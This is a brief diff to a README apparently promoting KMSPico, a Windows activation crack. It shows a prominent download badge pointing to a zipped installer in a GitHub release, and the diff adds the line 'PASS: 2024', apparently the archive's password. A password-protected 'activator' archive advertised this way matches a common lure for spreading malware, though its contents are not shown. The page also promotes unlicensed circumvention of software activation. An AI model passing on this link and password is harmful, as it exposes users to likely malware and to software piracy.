@@ -4,6 +4,9 @@
 
 [![DOWNLOAD KMSPICO](https://img.shields.io/badge/DOWNLOAD-KMSPICO-blue?style=for-the-badge)](https://github.com/olaomofavour/KMS-Pico-Activator/releases/download/KMS/Installer.zip)
 
+## PASS: 2024
+
+
 ---
 
 ## Knowing KMSPico: Its Definition and Operation
